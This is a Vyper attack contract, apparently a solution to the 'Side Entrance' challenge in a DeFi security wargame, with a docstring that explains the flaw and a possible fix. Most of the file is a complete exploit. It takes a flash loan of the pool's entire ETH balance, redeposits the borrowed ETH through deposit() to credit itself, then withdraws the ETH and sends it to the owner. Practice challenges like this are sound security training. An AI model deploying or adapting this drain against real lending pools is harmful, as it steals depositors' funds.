# @version ^0.3.7

"""
The vulnerability is on line 42 of SideEntranceLenderPool.sol.  
The pool sends the ETH to the receiver contract as msg.value 
and the receiver contract can then reuse that msg.value in the 
same transaction. It just so happens that this pool also accepts
deposits via a `deposit()` function where they do accounting based
on the msg.value sent to the function. An attacker can take out a 
flash loan and reuse the msg.value in the same transaction to call 
`deposit()` on the pool and credit their account. They can then call 
`withdraw()` to redeem the ETH that was credited to their account. 
Since they never had ETH and used the msg.value from the flashloan to 
credit their account they will be withdrawing ETH that is not theirs.
If the pool also did a check in the `flashLoan()` function for the 
balance of the sender, via balances[msg.sender], to ensure their balance
stays the same during the flash loan, it would protect against this attack.
"""

interface IPool:
    def flashLoan(amount: uint256): nonpayable
    def withdraw(): nonpayable
    def deposit(): payable

owner: immutable(address)

pool: IPool

@external
@payable
def __init__(_pool: IPool):
    owner = msg.sender
    self.pool = _pool

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.pool.flashLoan(self.pool.address.balance)
    self.pool.withdraw()
    send(msg.sender, self.balance)

@external
@payable
def execute():
    self.pool.deposit(value=msg.value)

@external
@payable
def __default__():
    pass
